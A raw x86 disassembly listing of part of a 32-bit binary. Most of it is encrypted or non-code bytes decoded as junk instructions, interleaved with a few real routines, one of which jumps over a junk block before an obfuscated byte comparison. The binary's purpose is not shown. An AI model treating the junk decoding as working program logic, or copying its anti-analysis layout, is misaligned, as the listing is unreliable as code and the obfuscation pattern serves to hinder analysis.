  414045:	das    
  414046:	aam    0x9d
  414048:	lods   eax,DWORD PTR ds:[esi]
  414049:	and    al,0x89
  41404b:	mov    ss,WORD PTR [esi+0x5adc1235]
  414051:	jg     0x4140a7
  414053:	mov    edi,0x83275edb
  414058:	jne    0x4140d5
  41405a:	jp     0x4140c2
  41405c:	in     eax,0xbd
  41405e:	stos   BYTE PTR es:[edi],al
  41405f:	add    edi,edx
  414061:	dec    edx
  414062:	inc    eax
  414063:	aam    0xcc
  414065:	sub    eax,0xb736d6af
  41406a:	or     eax,0x42e168cd
  41406f:	loop   0x414024
  414071:	loopne 0x414057
  414073:	popf   
  414074:	dec    edx
  414075:	or     edi,edx
  414077:	mov    cl,0xb2
  414079:	sbb    al,BYTE PTR [eax]
  41407b:	mov    dl,BYTE PTR [esi+0x4b]
  41407e:	sub    DWORD PTR [eax-0x2a],edi
  414081:	and    DWORD PTR [esi],edi
  414083:	add    al,BYTE PTR [ecx-0x13]
  414086:	cdq    
  414087:	lahf   
  414088:	mov    edi,0xd255faf
  41408d:	clc    
  41408e:	inc    ebp
  41408f:	enter  0x84c4,0x50
  414093:	xor    ecx,ecx
  414095:	and    ebp,DWORD PTR [edi+0x5185be7f]
  41409b:	aaa    
  41409c:	mov    al,ds:0x3f2a8c0b
  4140a1:	sbb    DWORD PTR [eax],ebx
  4140a3:	sub    al,0x20
  4140a5:	repnz push ebp
  4140a7:	sub    BYTE PTR [esi+0x38],0xd6
  4140ab:	lahf   
  4140ac:	mov    al,ds:0x61a20e4e
  4140b1:	xchg   edx,eax
  4140b2:	faddp  st(3),st
  4140b4:	cmp    ecx,DWORD PTR [ebp+0x65]
  4140b7:	cmp    cl,BYTE PTR [edx]
  4140b9:	repz sbb esp,eax
  4140bc:	and    BYTE PTR [ebx],cl
  4140be:	sahf   
  4140bf:	inc    esi
  4140c0:	mov    ebx,0xa504e1da
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x42202e
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ecx+edi*2-0x5]
  414159:	(bad)  
  41415a:	mov    esi,0x18182c1a
  41415f:	rcl    BYTE PTR [edx],1
  414161:	sbb    BYTE PTR [eax],bl
  414163:	inc    eax
  414164:	sar    BYTE PTR [ecx+0x171c7af8],cl
  41416a:	mov    esp,0x660402e6
  41416f:	inc    esp
  414170:	pop    eax
  414171:	or     DWORD PTR [ebp+0x3938dbc0],edx
  414177:	jg     0x414183
  414179:	cld    
  41417a:	xchg   ebx,eax
  41417b:	fdiv   QWORD PTR [ecx-0x7b]
  41417e:	mov    ebx,ebx
  414180:	sbb    DWORD PTR [esi-0x513267fe],0xce9fde88
  41418a:	test   al,0x8e
  41418c:	sti    
  41418d:	repz dec edi
  41418f:	lods   al,BYTE PTR ds:[esi]
  414190:	(bad)  
  414191:	stos   BYTE PTR es:[edi],al
  414192:	jecxz  0x41413b
  414194:	sub    DWORD PTR [ecx-0x7df6ce12],esp
  41419a:	xchg   edi,eax
  41419b:	enter  0xb41a,0x94
  41419f:	(bad)  
  4141a0:	ss shr esp,1
  4141a3:	fs cmp ecx,esi
  4141a6:	cmp    eax,0xedbdadf3
  4141ab:	and    ebp,eax
  4141ad:	pop    ss
  4141ae:	fiadd  DWORD PTR [edi+0x3d]
  4141b1:	or     al,0x44
  4141b3:	sbb    al,0xa
  4141b5:	rol    cl,1
  4141b7:	aas    
  4141b8:	test   BYTE PTR [edx-0x7ab009c2],cl
  4141be:	mov    esi,0x115a221c
  4141c3:	dec    eax
  4141c4:	std    
  4141c5:	test   al,0xae
  4141c7:	inc    ecx
  4141c8:	outs   dx,DWORD PTR ds:[esi]
  4141c9:	xchg   edi,eax
  4141ca:	iret   
  4141cb:	fst    QWORD PTR [ebx-0xb5f65ce]
  4141d1:	jp     0x4141fe
  4141d3:	mov    ss,WORD PTR [ecx-0x15]
  4141d6:	fiadd  DWORD PTR [ebx+0x32]
  4141d9:	adc    BYTE PTR [ecx+0xdd52629],cl
  4141df:	mov    ecx,0xffcff6f6
  4141e4:	bound  eax,QWORD PTR [edi]
  4141e6:	sbb    edi,DWORD PTR [eax]
  4141e8:	cld    
  4141e9:	mov    al,0x5
  4141eb:	pop    esp
  4141ec:	push   es
  4141ed:	push   edi
  4141ee:	mov    ecx,0x2f8c20b3
  4141f3:	arpl   WORD PTR [ecx+0x67],bp
  4141f6:	push   ebp
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	jmp    FWORD PTR [ecx+esi*4]
  4141fb:	inc    edi
  4141fc:	sbb    eax,0x284f9903
  414201:	pop    esp
  414202:	add    eax,0x9348677e
  414207:	inc    ebx
  414208:	sbb    ebx,DWORD PTR [edi+0x50b0cf5e]
  41420e:	aam    0x29
  414210:	rol    BYTE PTR [edi+0x47],1
  414213:	mov    ch,0xb5
  414215:	mov    esp,0xdc44e277
  41421a:	gs loopne 0x4141cd
  41421d:	leave  
  41421e:	cwde   
  41421f:	sub    al,0xef
  414221:	cdq    
  414222:	cmp    esi,DWORD PTR [eax+eiz*2-0x5f]
  414226:	dec    edi
  414227:	enter  0xd89d,0x83
  41422b:	es cmp eax,0x4ae4498a
  414231:	jmp    FWORD PTR [ecx]
  414233:	call   0xdf87:0x1f66c507
  41423a:	adc    ecx,edx
  41423c:	ins    DWORD PTR es:[edi],dx
  41423d:	daa    
  41423e:	adc    BYTE PTR [edi+0x71],0xe8
  414242:	out    dx,al
  414243:	xor    BYTE PTR [ecx],ch
  414245:	adc    dh,al
  414247:	ins    BYTE PTR es:[edi],dx
  414248:	dec    esp
  414249:	mov    esi,0xea74ece4
  41424e:	jnp    0x4142a7
  414250:	(bad)  
  414251:	mov    esp,0x4eaa1bb2
  414256:	mov    WORD PTR [esi],ds
  414258:	pop    ebp
  414259:	xchg   edx,eax
  41425a:	popa   
  41425b:	inc    esi
  41425c:	imul   esi,esp,0x77
  41425f:	xchg   ebx,eax
  414260:	and    ch,BYTE PTR [eax+0x559552d6]
  414266:	out    dx,eax
  414267:	retf   
  414268:	es int3 
  41426a:	jp     0x44c2a9d7
  414270:	(bad)  [ebp-0x1c28eb9f]
  414276:	jle    0x41429e
  414278:	mov    esi,DWORD PTR [eax+0x542c8dee]
  41427e:	mov    bh,0x39
  414280:	lods   eax,DWORD PTR ds:[esi]
  414281:	inc    eax
  414282:	jmp    0xcc73:0x180c06f5
  414289:	(bad)  
  41428a:	aad    0xc8
  41428c:	sbb    bl,BYTE PTR ds:0xe017f8c5
  414292:	and    esi,ebp
  414294:	(bad)  
  414296:	push   ebx
  414297:	sahf   
  414298:	mov    edi,0xca76a422
  41429d:	les    ecx,FWORD PTR [ecx]
  41429f:	inc    ebp
  4142a0:	es cs jmp 0x6434:0x46eaec92
  4142a9:	sub    al,0xb7
  4142ab:	jnp    0x4142f5
  4142ad:	aam    0x57
  4142af:	push   esi
  4142b0:	arpl   WORD PTR [ebx+0xfc07e92],dx
  4142b6:	cmc    
  4142b7:	mov    cl,0x4f
  4142b9:	push   ebx
  4142ba:	mov    dh,0x1e
  4142bc:	retf   0xc52b
  4142bf:	ret    0xc7f5
  4142c2:	inc    esi
  4142c3:	iret   
  4142c4:	les    edi,FWORD PTR [edi+0x6a042eb]
  4142ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142cb:	adc    BYTE PTR [ebx-0x5170f50f],al
  4142d1:	and    BYTE PTR [edx+0x31],0x1f
  4142d5:	mov    ch,0x2a
  4142d7:	add    ebp,esp
  4142d9:	pop    ebx
  4142da:	and    ebp,DWORD PTR [ebx+0x798883dd]
  4142e0:	jbe    0x4142b0
  4142e2:	cwde   
  4142e3:	mov    al,ds:0x4d70201
  4142e8:	addr16 cmp eax,0x5ae5ed41
  4142ee:	add    BYTE PTR [ebp+0x4d],bh
  4142f1:	dec    ebp
  4142f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f3:	mov    bl,0x43
  4142f5:	push   0x777678c
  4142fa:	add    dh,BYTE PTR [esp+eiz*2]
  4142fd:	or     ebp,ebx
  4142ff:	xor    BYTE PTR [esp+ebx*4+0x2b],0x2c
  414304:	enter  0x9ae0,0x1b
  414308:	xor    al,0xa5
  41430a:	ins    BYTE PTR es:[edi],dx
  41430b:	pushf  
  41430c:	fwait
  41430d:	or     al,0xef
  41430f:	addr16 push es
  414311:	aam    0xa3
  414313:	sbb    BYTE PTR [eax+0x5895b0db],dl
  414319:	or     al,0x98
  41431b:	sub    ebx,edi
  41431d:	mov    BYTE PTR [esp+eax*4],bl
  414320:	pop    eax
  414321:	int    0xc5
  414323:	pop    ecx
  414324:	sbb    al,0xc7
  414326:	mov    ebx,0x7f6a1740
  41432b:	mov    edx,0xf695fdfc
  414330:	aaa    
  414331:	sub    eax,0x74ed9d37
  414336:	inc    esi
  414337:	popf   
  414338:	leave  
  414339:	ror    DWORD PTR [esi],0x83
  41433c:	and    bh,ch
  41433e:	dec    esp
  41433f:	mov    ebx,esi
  414341:	dec    esi
  414342:	mov    BYTE PTR [edi-0x6e],dh
  414345:	xchg   esp,eax
  414346:	sbb    BYTE PTR [ecx],bh
  414348:	fs and eax,0xe4cd5168
  41434e:	aaa    
  41434f:	dec    eax
  414350:	adc    eax,0xa48e7341
  414355:	mov    esp,0xdec4b3de
  41435a:	nop
  41435b:	pop    es
  41435c:	fsub   QWORD PTR [ebp-0x70]
  41435f:	xchg   ebx,eax
  414360:	shl    BYTE PTR [edx+0x3c],0xcb
  414364:	jnp    0x41431a
  414366:	and    ah,BYTE PTR [esi]
  414368:	sbb    DWORD PTR [ebx],edi
  41436a:	in     eax,dx
  41436b:	jge    0x4143a6
  41436d:	and    ebp,DWORD PTR [edx]
  41436f:	mov    al,ds:0xc5817bee
  414374:	(bad)  
  414376:	jo     0x4143db
  414378:	xchg   BYTE PTR [ebx-0x53ad9338],ah
  41437e:	es push eax
  414380:	adc    eax,DWORD PTR [eax-0x35]
  414383:	xor    bl,al
  414385:	pop    edx
  414386:	cmp    eax,DWORD PTR [edi]
  414388:	mov    esi,0x5144d657
  41438d:	icebp  
  41438e:	push   edx
  41438f:	push   ecx
  414390:	aaa    
  414391:	add    ebp,DWORD PTR [edi+0x3873ae7d]
  414397:	cmp    ch,ah
  414399:	cli    
  41439a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439b:	mov    ds:0xcb02045e,eax
  4143a0:	out    dx,al
  4143a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143a2:	inc    esp
  4143a3:	mov    eax,ecx
  4143a5:	in     eax,dx
  4143a6:	(bad)  
  4143a7:	stos   DWORD PTR es:[edi],eax
  4143a8:	push   edi
  4143a9:	jmp    0x41436a
  4143ab:	fdiv   st,st(4)
  4143ad:	pop    edi
  4143ae:	sub    ecx,eax
  4143b0:	mov    DWORD PTR [edx-0x4d3a3c14],eax
  4143b6:	into   
  4143b7:	push   ecx
  4143b8:	jecxz  0x41441c
  4143ba:	add    eax,0xd819a02e
  4143bf:	mov    bl,0x97
  4143c1:	push   ds
  4143c2:	(bad)  
  4143c3:	sbb    BYTE PTR [ecx-0xf],bl
  4143c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c7:	push   cs
  4143c8:	xchg   edx,eax
  4143c9:	mov    WORD PTR [esi+0x0],?
  4143cc:	nop
  4143cd:	retf   0x9fd8
  4143d0:	dec    eax
  4143d1:	mov    ebp,0xd58e55fe
  4143d6:	pop    edx
  4143d7:	xchg   esi,eax
  4143d8:	mov    esp,0x6d0be9c9
  4143dd:	nop
  4143de:	pop    ebp
  4143df:	(bad)  
  4143e1:	pop    es
  4143e2:	add    eax,0xb9c64a74
  4143e7:	pop    ss
  4143e8:	jae    0x41443b
  4143ea:	mov    ah,0xf4
  4143ec:	icebp  
  4143ed:	mov    ebx,0xb9c3e428
  4143f2:	jns    0x4143a3
  4143f4:	cli    
  4143f5:	push   ss
  4143f6:	aad    0x66
  4143f8:	int    0x2e
  4143fa:	dec    eax
  4143fb:	jmp    0x5bb2:0x2e2b03be
  414402:	ja     0x414439
  414404:	fcomp  DWORD PTR [edi]
  414406:	adc    al,0x98
  414408:	fs rcl dh,1
  41440b:	or     edi,ebx
  41440d:	lock pop eax
  41440f:	iret   
  414410:	dec    esp
  414411:	jp     0x41439d
  414413:	push   0x5fc5513b
  414418:	cmp    eax,0x2ea4fc09
  41441d:	adc    al,0x72
  41441f:	stos   DWORD PTR es:[edi],eax
  414420:	xor    DWORD PTR [eax],eax
  414422:	push   esi
  414423:	inc    edx
  414424:	mov    al,ds:0xe967ae96
  414429:	scas   eax,DWORD PTR es:[edi]
  41442a:	sbb    BYTE PTR ds:0x38d1dc59,0x27
  414431:	inc    esp
  414432:	aaa    
  414433:	lahf   
  414434:	mov    dl,BYTE PTR [eax]
  414436:	xor    DWORD PTR [esi+0x7f34bd3e],0xffffffab
  41443d:	or     ah,BYTE PTR [edi]
  41443f:	mov    edx,0x14721ef0
  414444:	mov    ds:0x612866a9,al
  414449:	bound  edi,QWORD PTR [esi+0x13]
  41444c:	aas    
  41444d:	pop    ebx
  41444e:	pushf  
  41444f:	mov    ds:0xa30b684c,al
  414454:	addr16 das 
  414456:	aaa    
  414457:	adc    edx,DWORD PTR [edi+0x51335f5b]
  41445d:	lea    ebp,[ebp+0x2f]
  414460:	fild   QWORD PTR [eax]
  414462:	mov    cl,0xee
  414464:	scas   al,BYTE PTR es:[edi]
  414465:	jge    0x4144a5
  414467:	ss jmp 0x41441b
  41446a:	outs   dx,BYTE PTR ds:[esi]
  41446b:	and    BYTE PTR [esi+eiz*8+0x2a53edf4],bh
  414472:	mov    al,ds:0x770f6059
  414477:	and    ah,BYTE PTR [edi]
  414479:	add    BYTE PTR [edi],ch
  41447b:	add    BYTE PTR [ebx],ch
  41447d:	cmp    esi,DWORD PTR [esi]
  41447f:	js     0x414430
  414481:	adc    ebp,DWORD PTR [edx]
  414483:	push   ss
  414484:	lds    esi,FWORD PTR [edx+0xb7bfc13]
  41448a:	jo     0x4144c2
  41448c:	(bad)  
  41448d:	bound  edx,QWORD PTR [edx-0x24]
  414490:	(bad)  
  414491:	push   eax
  414492:	jge    0x414493
  414494:	mov    dh,0x26
  414496:	xchg   edi,eax
  414497:	mov    esi,0x7d05e8
  41449c:	test   eax,0x4994f155
  4144a1:	add    eax,0x1f2ac89c
  4144a6:	mov    edi,0x5e9fbb87
  4144ab:	fsub   st(4),st
  4144ad:	or     edi,DWORD PTR [ebp-0x7a32369a]
  4144b3:	call   0x1c99:0x3944ff89
  4144ba:	in     al,dx
  4144bb:	mov    esi,0x44e6ebb8
  4144c0:	cwde   
  4144c1:	xor    eax,0xd697c78e
  4144c6:	and    esp,edi
  4144c8:	push   esp
  4144c9:	mov    ah,0x93
  4144cb:	push   ebp
  4144cc:	sub    cl,dh
  4144ce:	sub    cl,dh
  4144d0:	xor    eax,0x112e3d8f
  4144d5:	loope  0x414479
  4144d7:	inc    ecx
  4144d8:	iret   
  4144d9:	cmp    BYTE PTR [ecx],al
  4144db:	mov    al,ds:0x6f32d9e5
  4144e0:	out    0x49,eax
  4144e2:	and    DWORD PTR [ecx],0xfffffff3
  4144e5:	in     al,dx
  4144e6:	enter  0x4cfc,0x75
  4144ea:	dec    edx
  4144eb:	mov    dl,0xb1
  4144ed:	jle    0x4144d5
  4144ef:	or     al,0x23
  4144f1:	mov    dl,0x13
  4144f3:	inc    edi
  4144f4:	in     eax,0x5
  4144f6:	les    esp,FWORD PTR [esi]
  4144f8:	ret    
  4144f9:	mov    ds:0xbb3e9268,eax
  4144fe:	popf   
  4144ff:	dec    eax
  414500:	repnz mov ch,0x5f
  414503:	jmp    0x300498af
  414508:	pop    ds
  414509:	sub    al,0x4
  41450b:	mov    DWORD PTR [ebp-0x8],0x3204
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xea7c:0x73623c4c
  414595:	aad    0x9b
  414597:	jo     0x41456b
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [esi],dh
  4145a1:	lock and al,0x30
  4145a4:	aad    0x9c
  4145a6:	(bad)  
  4145a7:	ss cs jns 0x414536
  4145ab:	outs   dx,BYTE PTR ds:[esi]
  4145ac:	jecxz  0x4145c0
  4145ae:	sbb    dh,ah
  4145b0:	pop    edi
  4145b1:	test   BYTE PTR [esi-0x3d],dl
  4145b4:	xchg   ebp,eax
  4145b5:	sbb    eax,0xb7d63ff5
  4145ba:	cmp    ecx,DWORD PTR [eax+ecx*2]
  4145bd:	cwde   
  4145be:	mov    WORD PTR [edx],cs
  4145c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c1:	push   eax
  4145c2:	pop    es
  4145c3:	inc    edi
  4145c4:	push   ebx
  4145c5:	sub    bl,BYTE PTR [ebp+0x10]
  4145c8:	cmp    ebx,DWORD PTR [ebp-0x1a]
  4145cb:	mov    DWORD PTR [edx],edi
  4145cd:	jecxz  0x4145aa
  4145cf:	and    esi,edi
  4145d1:	push   0x43115010
  4145d6:	sbb    BYTE PTR [ecx-0x33769bd4],bh
  4145dc:	cmp    eax,0x457b04a3
  4145e1:	popf   
  4145e2:	iret   
  4145e3:	xor    eax,0xf2258b02
  4145e8:	mov    ecx,0xbf3992a2
  4145ed:	push   0x2dd3259e
  4145f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f3:	enter  0x5937,0x87
  4145f7:	call   0x8f281f84
  4145fc:	push   cs
  4145fd:	neg    esp
  4145ff:	aas    
  414600:	xor    eax,0x9c67ae0d
  414605:	mov    ebx,0xca3bdf37
  41460a:	imul   edx,esp,0x4b60c531
  414610:	(bad)  
  414611:	in     eax,dx
  414612:	jne    0x4145b9
  414614:	gs and edx,eax
  414617:	cld    
  414618:	retf   
  414619:	jae    0x4145fc
  41461b:	jmp    0xcee79d6f
  414620:	jmp    0x41462a
  414622:	add    ebp,DWORD PTR [ecx+0x44]
  414625:	sub    eax,edi
  414627:	mov    eax,ds:0x9dd8a7bc
  41462c:	js     0x414663
  41462e:	test   DWORD PTR [edi-0x22571270],esp
  414634:	int    0x0
  414636:	js     0x41467e
  414638:	rol    DWORD PTR [eiz*8-0x1e927d1b],cl
  41463f:	mov    ch,0x98
  414641:	(bad)  
  414642:	adc    ah,al
  414644:	test   ebx,0xea0be436
  41464a:	inc    ebp
  41464b:	pop    DWORD PTR [ebx]
  41464d:	sub    DWORD PTR [edi+esi*8-0x3a37fd4],esi
  414654:	mov    al,0x73
  414656:	sub    bh,BYTE PTR [edx-0x5404f845]
  41465c:	xor    DWORD PTR [esi],ecx
  41465e:	repnz dec DWORD PTR [edi+0x60]
  414662:	jne    0x4146be
  414664:	fstp   QWORD PTR [edi+edi*2+0x54]
  414668:	sub    BYTE PTR [esi-0x14],ah
  41466b:	scas   al,BYTE PTR es:[edi]
  41466c:	xor    al,0xa9
  41466e:	out    0xf4,eax
  414670:	mov    dh,0x7d
  414672:	mov    ?,ecx
  414674:	nop
  414675:	xchg   DWORD PTR [esi-0x7477d092],ecx
  41467b:	mov    esp,0x1b9ac60
  414680:	pop    ds
  414681:	xor    bh,cl
  414683:	push   edi
  414684:	push   ss
  414685:	pop    esp
  414686:	(bad)  
  414687:	xchg   ecx,eax
  414688:	sub    ch,BYTE PTR ds:0xa2edf11c
  41468e:	sbb    DWORD PTR [esi-0x5617e20f],eax
  414694:	mov    BYTE PTR [eax-0x45],dh
  414697:	xchg   edi,eax
  414698:	inc    edx
  414699:	jae    0x41466d
  41469b:	xor    DWORD PTR [ebx-0x79dc65],esi
  4146a1:	mov    ecx,0x1b198735
  4146a6:	aad    0xf9
  4146a8:	xor    DWORD PTR [ecx+0x456df2d1],eax
  4146ae:	fiadd  DWORD PTR [edx+0x7dc9dcad]
  4146b4:	cmp    eax,0x423dc498
  4146b9:	sbb    DWORD PTR [edi+0x192ee4a5],ebp
  4146bf:	mov    bh,0x27
  4146c1:	fs xchg ecx,eax
  4146c3:	cmp    ch,BYTE PTR [ecx]
  4146c5:	adc    DWORD PTR [ecx+0x41],ebp
  4146c8:	pop    ebx
  4146c9:	and    al,0xea
  4146cb:	std    
  4146cc:	stos   BYTE PTR es:[edi],al
  4146cd:	sub    DWORD PTR [esi],ebx
  4146cf:	inc    ebp
  4146d0:	push   ebx
  4146d1:	mov    BYTE PTR [eax+esi*8+0x6fc1e4d2],bh
  4146d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146d9:	(bad)  
  4146da:	int3   
  4146db:	int    0x39
  4146dd:	mov    bh,0x1b
  4146df:	sbb    eax,0x375ecafd
  4146e4:	cmp    DWORD PTR [ecx+0x73614e9d],0x351504e0
  4146ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ef:	aas    
  4146f0:	xor    DWORD PTR [ebx],esi
  4146f2:	cmp    BYTE PTR ds:0x8a39b226,dh
  4146f8:	xchg   ebp,eax
  4146f9:	xor    DWORD PTR [edi+0xe0385aa],0x220fc880
  414703:	ror    cl,0xe2
  414706:	fs pushf 
  414708:	mov    edx,0xa4fd0379
  41470d:	xchg   ebp,eax
  41470e:	das    
  41470f:	cmp    DWORD PTR [eax-0x1f12fce3],0x5
  414716:	pop    ebx
  414717:	dec    edi
  414718:	jne    0x4146f8
  41471a:	xor    al,0x3
  41471c:	fnstcw WORD PTR [ecx-0x58]
  41471f:	hlt    
  414720:	pop    esp
  414721:	mov    edx,0x8d5af2ce
  414726:	adc    BYTE PTR [ebx],ah
  414728:	sbb    BYTE PTR [esi-0x154ce7dc],dh
  41472e:	mov    ebp,0x1e6809ac
  414733:	stc    
  414734:	aas    
  414735:	jbe    0x41476c
  414737:	push   eax
  414738:	ss jb  0x41474c
  41473b:	sub    eax,0x7f82aa3f
  414740:	mov    ds:0x27dad8ba,al
  414745:	out    dx,al
  414746:	xor    eax,0xe08a6e03
  41474b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41474c:	pop    es
  41474d:	inc    eax
  41474e:	and    ecx,DWORD PTR [esi]
  414750:	pushf  
  414751:	push   eax
  414752:	sub    al,0x5c
  414754:	add    edi,DWORD PTR [ecx]
  414756:	mov    dh,0x93
  414758:	(bad)  
  414759:	push   0x76
  41475b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41475c:	cmp    ch,BYTE PTR [esi-0x2ec9a2fe]
  414762:	and    al,BYTE PTR [ebp-0x632ad5d]
  414768:	lock popf 
  41476a:	xor    ebx,esp
  41476c:	sbb    eax,0x98a31a4f
  414771:	mul    DWORD PTR [ecx-0x80]
  414774:	icebp  
  414775:	sbb    cl,BYTE PTR [edi]
  414777:	data16 (bad) fs:[ecx]
  41477b:	mov    edx,0x5f7ff9a
  414780:	dec    eax
  414781:	mov    ch,0x89
  414783:	in     eax,0xfd
  414785:	and    BYTE PTR [edi],0xd7
  414788:	add    BYTE PTR [edi],ch
  41478a:	shl    BYTE PTR [edx-0x1d],0xaf
  41478e:	repz pop ds
  414790:	ja     0x414794
  414792:	mov    al,0xc6
  414794:	dec    edi
  414795:	out    0x61,eax
  414797:	in     eax,0xf7
  414799:	xrelease mov BYTE PTR ds:0xdf18684e,ah
  4147a0:	push   ss
  4147a1:	call   FWORD PTR ds:0x41aa051b
  4147a7:	jmp    0x945b701c
  4147ac:	jbe    0x4147f9
  4147ae:	test   al,0x9
  4147b0:	rcl    bh,cl
  4147b2:	mov    eax,0xa507b177
  4147b7:	add    BYTE PTR [ecx+0x483638af],bl
  4147bd:	push   0x1ff7fc9f
  4147c2:	or     BYTE PTR [eax],0x51
  4147c5:	dec    ecx
  4147c6:	xchg   ecx,eax
  4147c7:	ds icebp 
  4147c9:	mov    ds:0x28a5cc9,eax
  4147ce:	mov    WORD PTR [edx-0x1741fa5a],fs
  4147d4:	adc    dl,dh
  4147d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d7:	adc    eax,0x88a9b461
  4147dc:	stc    
  4147dd:	arpl   WORD PTR [edx+0x53352ded],ax
  4147e3:	hlt    
  4147e4:	psrld  mm5,QWORD PTR [edx]
  4147e7:	pop    ecx
  4147e8:	(bad)  
  4147ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147eb:	mov    ebp,0xacd6cde2
  4147f0:	mov    cl,0x80
  4147f2:	fisttp WORD PTR [ebx+0x28992371]
  4147f8:	xor    dl,0xb2
  4147fb:	dec    eax
  4147fc:	fst    QWORD PTR [ecx+0x4b]
  4147ff:	cmc    
  414800:	cmp    esp,DWORD PTR [ebx+edi*4]
  414803:	sbb    ax,0xeb21
  414807:	xor    bl,dl
  414809:	dec    ecx
  41480a:	jnp    0x41480c
  41480c:	mov    ah,0xce
  41480e:	xlat   BYTE PTR ds:[ebx]
  41480f:	sbb    al,0xa5
  414811:	cmp    bl,BYTE PTR [esi-0x6c]
  414814:	xchg   ebx,eax
  414815:	pop    eax
  414816:	dec    eax
  414817:	dec    esi
  414818:	call   0x9fc651ae
  41481d:	bound  edx,QWORD PTR [edx+0x27]
  414820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414821:	shl    BYTE PTR cs:[esi+0x56515144],cl
  414828:	fisttp DWORD PTR [edi+0x3531425a]
  41482e:	pop    ds
  41482f:	test   eax,0x98a8d531
  414834:	mov    eax,0xa1645ad4
  414839:	outs   dx,BYTE PTR ds:[esi]
  41483a:	cmp    bh,BYTE PTR [edi+0x3a4a2f75]
  414840:	pop    eax
  414841:	xchg   ebx,eax
  414842:	xor    DWORD PTR [ecx],ebp
  414844:	push   cs
  414845:	xchg   ecx,eax
  414846:	pop    ecx
  414847:	ror    DWORD PTR [ebp+0x1d],1
  41484a:	jnp    0x41481b
  41484c:	cdq    
  41484d:	enter  0x18e6,0x80
  414851:	out    0xfb,eax
  414853:	sbb    bh,BYTE PTR [eax+0x22be7d03]
  414859:	jnp    0x4147fd
  41485b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41485c:	push   esp
  41485d:	mov    cl,0xb0
  41485f:	lods   eax,DWORD PTR ds:[esi]
  414860:	and    eax,0x39d042ca
  414865:	and    cl,dh
  414867:	xor    ch,BYTE PTR [edx-0x6ea743ad]
  41486d:	push   ebp
  41486e:	ss push ebp
  414870:	stc    
  414871:	mov    esi,DWORD PTR [ebx+0x1f014576]
  414877:	test   al,0x99
  414879:	fild   WORD PTR ds:0xbdb88e87
  41487f:	not    esp
  414881:	mov    eax,eax
  414883:	loop   0x414859
